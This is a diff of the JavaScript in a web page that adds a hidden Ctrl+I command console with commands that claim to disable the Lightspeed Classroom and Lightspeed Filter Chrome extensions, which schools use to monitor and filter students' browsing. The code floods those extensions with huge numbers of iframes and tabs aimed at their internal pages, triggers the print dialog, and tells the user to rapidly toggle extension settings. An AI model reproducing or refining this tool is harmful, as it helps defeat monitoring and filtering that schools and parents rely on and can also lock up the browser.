@@ -104,270 +104,180 @@
 
     <script>
         const allCommands = [
-    "iframes set <number> - Set the number of iframes to create",
-    "iframes set max - Set the number of iframes to infinity",
-    "iframes - Show the default number of iframes",
-    "tabs set <number> - Set the number of tabs to open",
-    "tabs set max - Set the number of tabs to infinity",
-    "tabs - Show the number of tabs to be opened",
-    "controls - Show all available commands",
-    "time - Display the current time",
-    "clear - Clear the command history",
-    "disablelightspeedclassroom - Disable Lightspeed Classroom permanently",
-    "disablelightspeedfilter - Disable Lightspeed Filter permanently",
-    "GO TIME! - Mix both extensions in each tab",
-    "fart",
-];
+            "iframes set <number> - Set the number of iframes to create",
+            "iframes set max - Set the number of iframes to infinity",
+            "iframes - Show the default number of iframes",
+            "tabs set <number> - Set the number of tabs to open",
+            "tabs set max - Set the number of tabs to infinity",
+            "tabs - Show the number of tabs to be opened",
+            "controls - Show all available commands",
+            "time - Display the current time",
+            "clear - Clear the command history",
+            "disablelightspeedclassroom - Disable Lightspeed Classroom permanently",
+            "disablelightspeedfilter - Disable Lightspeed Filter permanently",
+            "GO TIME! - Mix both extensions in each tab",
+            "fart",
+            "poopy",
+        ];
 
-let iframeCount = 100000; // Default number of iframes
-let tabCount = 50; // Default number of tabs
+        let iframeCount = 100000; // Default number of iframes
+        let tabCount = 50; // Default number of tabs
 
-// Function to toggle the command box visibility
-function toggleCmdBox() {
-    const cmdBox = document.getElementById('cmd-box');
-    const cmdHistory = document.getElementById('cmd-history');
+        // Function to toggle the command box visibility
+        function toggleCmdBox() {
+            const cmdBox = document.getElementById('cmd-box');
+            const cmdHistory = document.getElementById('cmd-history');
 
-    if (cmdBox.style.display === 'none' || cmdBox.style.display === '') {
-        cmdBox.style.display = 'flex'; // Show the command box
-        document.getElementById('cmd-input').focus(); // Focus the input field
-    } else {
-        cmdBox.style.display = 'none'; // Hide the command box
-        cmdHistory.classList.remove('show'); // Hide the command history
-    }
-}
-
-// Event listener for Ctrl + I
-document.addEventListener('keydown', (event) => {
-    if (event.ctrlKey && event.key === 'i') {
-        event.preventDefault(); // Prevent the default browser behavior (e.g., opening dev tools)
-        toggleCmdBox(); // Toggle the command box
-    }
-});
-
-// Event listener for Enter key
-document.getElementById('cmd-input').addEventListener('keydown', (event) => {
-    if (event.key === 'Enter') {
-        executeCommand(); // Execute the command when Enter is pressed
-    }
-});
-
-// Function to execute the command
-function executeCommand() {
-    const cmdInput = document.getElementById('cmd-input').value.trim();
-    if (cmdInput) {
-        if (cmdInput.toLowerCase() === 'controls') {
-            showControls();
-        } else if (cmdInput.toLowerCase() === 'clear') {
-            clearCommandHistory();
-        } else if (cmdInput.toLowerCase() === 'time') {
-            showTime();
-        } else if (cmdInput.toLowerCase().startsWith('iframes')) {
-            handleIframesCommand(cmdInput);
-        } else if (cmdInput.toLowerCase().startsWith('tabs')) {
-            handleTabsCommand(cmdInput);
-        } else if (cmdInput.toLowerCase() === 'disablelightspeedclassroom') {
-            disableLightspeedClassroom();
-        } else if (cmdInput.toLowerCase() === 'disablelightspeedfilter') {
-            disableLightspeedFilter();
-        } else if (cmdInput.toUpperCase() === 'GO TIME!') {
-            disableLightspeedMix();
-        } else {
-            addToHistory(`Invalid command: ${cmdInput}`);
+            if (cmdBox.style.display === 'none' || cmdBox.style.display === '') {
+                cmdBox.style.display = 'flex'; // Show the command box
+                document.getElementById('cmd-input').focus(); // Focus the input field
+            } else {
+                cmdBox.style.display = 'none'; // Hide the command box
+                cmdHistory.classList.remove('show'); // Hide the command history
+            }
         }
 
-        document.getElementById('cmd-input').value = ''; // Clear input
-    }
-}
+        // Event listener for Ctrl + I
+        document.addEventListener('keydown', (event) => {
+            if (event.ctrlKey && event.key === 'i') {
+                event.preventDefault(); // Prevent the default browser behavior
+                toggleCmdBox(); // Toggle the command box
+            }
+        });
 
-// Function to show all available commands
-function showControls() {
-    const cmdHistory = document.getElementById('cmd-history');
-    cmdHistory.innerHTML = allCommands.map(cmd => `<div>${cmd}</div>`).join('');
-    cmdHistory.classList.add('show');
-}
+        // Event listener for Enter key
+        document.getElementById('cmd-input').addEventListener('keydown', (event) => {
+            if (event.key === 'Enter') {
+                executeCommand(); // Execute the command when Enter is pressed
+            }
+        });
 
-// Function to clear command history
-function clearCommandHistory() {
-    const cmdHistory = document.getElementById('cmd-history');
-    cmdHistory.innerHTML = ''; // Clear the history display
-    cmdHistory.classList.remove('show'); // Hide the history
-}
+        // Function to execute the command
+        function executeCommand() {
+            const cmdInput = document.getElementById('cmd-input').value.trim();
+            if (cmdInput) {
+                if (cmdInput.toLowerCase() === 'controls') {
+                    showControls();
+                } else if (cmdInput.toLowerCase() === 'clear') {
+                    clearCommandHistory();
+                } else if (cmdInput.toLowerCase() === 'time') {
+                    showTime();
+                } else if (cmdInput.toLowerCase().startsWith('iframes')) {
+                    handleIframesCommand(cmdInput);
+                } else if (cmdInput.toLowerCase().startsWith('tabs')) {
+                    handleTabsCommand(cmdInput);
+                } else if (cmdInput.toLowerCase() === 'disablelightspeedclassroom') {
+                    disableExtension('kkbmdgjggcdajckdlbngdjonpchpaiea', 'Lightspeed Classroom');
+                } else if (cmdInput.toLowerCase() === 'disablelightspeedfilter') {
+                    disableExtension('adkcpkpghahmbopkjchobieckeoaoeem', 'Lightspeed Filter');
+                } else if (cmdInput.toUpperCase() === 'GO TIME!') {
+                    disableExtension('kkbmdgjggcdajckdlbngdjonpchpaiea', 'Lightspeed Classroom');
+                    disableExtension('adkcpkpghahmbopkjchobieckeoaoeem', 'Lightspeed Filter');
+                } else {
+                    addToHistory(`Invalid command: ${cmdInput}`);
+                }
 
-// Function to display the current time
-function showTime() {
-    const now = new Date();
-    addToHistory(`Current time: ${now.toLocaleTimeString()}`);
-}
-
-// Function to handle iframes commands
-function handleIframesCommand(cmdInput) {
-    const parts = cmdInput.split(' ');
-    if (parts[1] === 'set') {
-        if (parts[2] === 'max') {
-            iframeCount = 9007199254740991;
-            addToHistory(`Iframes set to infinity (MAX POWER)`);
-        } else if (!isNaN(parts[2])) {
-            iframeCount = parseInt(parts[2], 10);
-            addToHistory(`Iframes set to ${iframeCount}`);
+                document.getElementById('cmd-input').value = ''; // Clear input
+            }
         }
-    } else {
-        addToHistory(`Current iframes: ${iframeCount}`);
-    }
-}
 
-// Function to handle tabs commands
-function handleTabsCommand(cmdInput) {
-    const parts = cmdInput.split(' ');
-    if (parts[1] === 'set') {
-        if (parts[2] === 'max') {
-            tabCount = 9007199254740991; // Set a high number for "max power"
-            addToHistory('Tabs set to infinity (MAX POWER)');
-        } else if (!isNaN(parts[2])) {
-            tabCount = parseInt(parts[2], 10);
-            addToHistory(`Tabs set to ${tabCount}`);
+        // Function to show all available commands
+        function showControls() {
+            const cmdHistory = document.getElementById('cmd-history');
+            cmdHistory.innerHTML = allCommands.map(cmd => `<div>${cmd}</div>`).join('');
+            cmdHistory.classList.add('show');
         }
-    } else {
-        addToHistory(`Current tabs: ${tabCount}`);
-    }
-}
 
-// Function to disable Lightspeed Classroom
-function disableLightspeedClassroom() {
-    createIframesAndTabs("kkbmdgjggcdajckdlbngdjonpchpaiea", "Lightspeed Classroom");
-}
-
-// Function to disable Lightspeed Filter
-function disableLightspeedFilter() {
-    createIframesAndTabs("adkcpkpghahmbopkjchobieckeoaoeem", "Lightspeed Filter");
-}
-
-// Function to disable both extensions
-function disableLightspeedMix() {
-    disableLightspeedClassroom();
-    disableLightspeedFilter();
-}
-
-// Function to toggle extension settings
-function toggleExtensionSettings(extId, extName) {
-    const settingsUrl = `chrome://extensions/?id=${extId}`;
-    const settingsWindow = window.open(settingsUrl, "_blank");
-
-    if (!settingsWindow) {
-        addToHistory(`Failed to open settings for ${extName}. Please allow popups.`);
-        return;
-    }
-
-    // Simulate clicking the "Allow Access to File URLs" toggle
-    setTimeout(() => {
-        const toggleSelector = '#allow-on-file-urls';
-        const toggle = settingsWindow.document.querySelector(toggleSelector);
-        if (toggle) {
-            toggle.click();
-            addToHistory(`Toggled settings for ${extName}.`);
-        } else {
-            addToHistory(`Failed to find toggle for ${extName}.`);
+        // Function to clear command history
+        function clearCommandHistory() {
+            const cmdHistory = document.getElementById('cmd-history');
+            cmdHistory.innerHTML = ''; // Clear the history display
+            cmdHistory.classList.remove('show'); // Hide the history
         }
-    }, 2000); // Adjust the delay as needed
-}
 
-// Function to create iframes and tabs
-function createIframesAndTabs(extId, extName) {
-    const extUrl = `chrome-extension://${extId}/`;
-    let success = false; // Track if the iframe/tab overload succeeds
+        // Function to display the current time
+        function showTime() {
+            const now = new Date();
+            addToHistory(`Current time: ${now.toLocaleTimeString()}`);
+        }
 
-    for (let i = 0; i < tabCount; i++) {
-        setTimeout(() => {
-            const printerWindow = window.open("", "_blank");
-            if (!printerWindow) {
-                addToHistory(`Failed to open tab for ${extName}. Please allow popups.`);
-                return;
+        // Function to handle iframes commands
+        function handleIframesCommand(cmdInput) {
+            const parts = cmdInput.split(' ');
+            if (parts[1] === 'set') {
+                if (parts[2] === 'max') {
+                    iframeCount = 9007199254740991;
+                    addToHistory(`Iframes set to infinity (MAX POWER)`);
+                } else if (!isNaN(parts[2])) {
+                    iframeCount = parseInt(parts[2], 10);
+                    addToHistory(`Iframes set to ${iframeCount}`);
+                }
+            } else {
+                addToHistory(`Current iframes: ${iframeCount}`);
+            }
+        }
+
+        // Function to handle tabs commands
+        function handleTabsCommand(cmdInput) {
+            const parts = cmdInput.split(' ');
+            if (parts[1] === 'set') {
+                if (parts[2] === 'max') {
+                    tabCount = 9007199254740991; // Set a high number for "max power"
+                    addToHistory('Tabs set to infinity (MAX POWER)');
+                } else if (!isNaN(parts[2])) {
+                    tabCount = parseInt(parts[2], 10);
+                    addToHistory(`Tabs set to ${tabCount}`);
+                }
+            } else {
+                addToHistory(`Current tabs: ${tabCount}`);
+            }
+        }
+
+        // Function to disable an extension
+        function disableExtension(extId, extName) {
+            // Step 1: Guide the user to open the extension's settings page
+            const settingsUrl = `chrome://extensions/?id=${extId}`;
+            addToHistory(`To disable ${extName}:
+1. Open the following URL in a new tab: ${settingsUrl}
+2. Go back to this tab and click "OK" to proceed.`);
+
+            // Step 2: Create a large number of iframes to overload the extension
+            const iframeContainer = document.createElement('div');
+            iframeContainer.style.display = 'none'; // Hide the iframes
+            document.body.appendChild(iframeContainer);
+
+            for (let i = 0; i < iframeCount; i++) {
+                const iframe = document.createElement('iframe');
+                iframe.src = `chrome-extension://${extId}/`; // Point to the extension's internal page
+                iframeContainer.appendChild(iframe);
             }
 
-            printerWindow.document.title = `Disable ${extName}`;
-            printerWindow.document.body.style.backgroundColor = '#1e1f22';
-
-            // Add a loading spinner
-            const loadingContainer = printerWindow.document.createElement("div");
-            loadingContainer.style.position = "fixed";
-            loadingContainer.style.top = "50%";
-            loadingContainer.style.left = "50%";
-            loadingContainer.style.transform = "translate(-50%, -50%)";
-            loadingContainer.style.color = "white";
-            loadingContainer.style.fontSize = "20px";
-            loadingContainer.style.fontFamily = "'Roboto', sans-serif";
-            loadingContainer.style.textAlign = "center";
-
-            const spinner = printerWindow.document.createElement("div");
-            spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
-            spinner.style.borderTop = "4px solid white";
-            spinner.style.borderRadius = "50%";
-            spinner.style.width = "40px";
-            spinner.style.height = "40px";
-            spinner.style.animation = "spin 1s linear infinite";
-            spinner.style.margin = "0 auto 10px";
-
-            const loadingText = printerWindow.document.createElement("div");
-            loadingText.innerText = `Disabling ${extName}...`;
-
-            loadingContainer.appendChild(spinner);
-            loadingContainer.appendChild(loadingText);
-            printerWindow.document.body.appendChild(loadingContainer);
-
-            // Add CSS for the spinner
-            const style = printerWindow.document.createElement("style");
-            style.innerHTML = `
-                @keyframes spin {
-                    0% { transform: rotate(0deg); }
-                    100% { transform: rotate(360deg); }
-                }
-            `;
-            printerWindow.document.head.appendChild(style);
-
-            // Create iframes to overload the extension
+            // Step 3: Trigger the print dialog
             setTimeout(() => {
-                for (let j = 0; j < iframeCount; j++) {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = extUrl;
-                    iframe.width = "25px";
-                    iframe.height = "25px";
-                    iframe.style.border = "none";
-                    printerWindow.document.body.appendChild(iframe);
-                }
+                window.print(); // Trigger the print dialog
+            }, 1000);
 
-                // Remove the loading spinner
-                loadingContainer.remove();
+            // Step 4: Instruct the user to spam the toggle
+            addToHistory(`3. In the extensions tab, spam the "Allow Access to File URLs" toggle for 5 seconds.
+4. Close the extensions tab and return to this tab.
+5. Press "Cancel" on the print dialog.`);
 
-                // Print the window to trigger the extension's disable mechanism
-                printerWindow.print();
-
-                // Close the window after a delay
-                setTimeout(() => {
-                    printerWindow.close();
-                    addToHistory(`${extName} has been disabled!`);
-                    success = true; // Mark the operation as successful
-                }, 5000); // Adjust the delay as needed
-            }, 1000); // Adjust the delay as needed
-        }, i * 1000); // Delay between opening tabs
-    }
-
-    // Fallback: If the iframe/tab overload fails, toggle extension settings
-    setTimeout(() => {
-        if (!success) {
-            addToHistory(`Fallback: Attempting to toggle settings for ${extName}.`);
-            toggleExtensionSettings(extId, extName);
+            // Step 5: Clean up
+            setTimeout(() => {
+                iframeContainer.remove(); // Remove the iframes
+                addToHistory(`${extName} should now be disabled!`);
+            }, 5000);
         }
-    }, tabCount * 1000 + 5000); // Wait for all tabs to finish
-}
 
-// Function to add a message to the command history
-function addToHistory(message) {
-    const cmdHistory = document.getElementById('cmd-history');
-    const historyItem = document.createElement('div');
-    historyItem.textContent = message;
-    cmdHistory.appendChild(historyItem);
-    cmdHistory.classList.add('show');
-    cmdHistory.scrollTop = cmdHistory.scrollHeight; // Auto-scroll to the bottom
-}
+        // Function to add a message to the command history
+        function addToHistory(message) {
+            const cmdHistory = document.getElementById('cmd-history');
+            const historyItem = document.createElement('div');
+            historyItem.textContent = message;
+            cmdHistory.appendChild(historyItem);
+            cmdHistory.classList.add('show');
+            cmdHistory.scrollTop = cmdHistory.scrollHeight; // Auto-scroll to the bottom
+        }
     </script>
 </body>
 </html>
